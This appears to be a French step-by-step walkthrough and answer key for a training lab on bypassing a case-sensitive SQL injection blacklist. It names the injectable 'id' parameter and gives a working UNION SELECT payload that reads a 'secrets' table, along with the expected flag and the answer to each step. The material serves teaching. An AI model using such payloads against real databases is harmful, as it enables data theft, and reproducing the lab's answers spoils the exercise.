# SQLi Filter Bypass (Advanced)

## Objectif

Comprendre pourquoi une blacklist simple ne bloque pas une injection SQL. Le filtre bloque certains mots en minuscules, mais la requête SQL reste construite par concaténation.

En condition réelle, ouvrir le lab depuis la plateforme. Le front appelle l'endpoint de mission avec un chemin relatif comme `./api/mission?id=...`.

Flag attendu :

```text
FLAG{sqli_filter_bypass_advanced}
```

## Guide étape par étape

1. Le formulaire de mission envoie sa valeur vers :

```text
/api/mission?id=...
```

Le paramètre injectable est :

```text
id
```

Réponse de l'étape 1 :

```text
id
```

2. Le filtre bloque notamment `union`, `select`, `--` et `;`, mais il est sensible à la casse. La clause qui passe en majuscules est :

```text
UNION SELECT
```

Réponse de l'étape 2 :

```text
UNION SELECT
```

3. Dans le champ `id`, taper ce payload sans commentaire SQL :

```text
0 UNION SELECT 1,key,value FROM secrets
```

Le résultat doit faire apparaître la valeur stockée dans la table `secrets`.

Réponse finale :

```text
FLAG{sqli_filter_bypass_advanced}
```
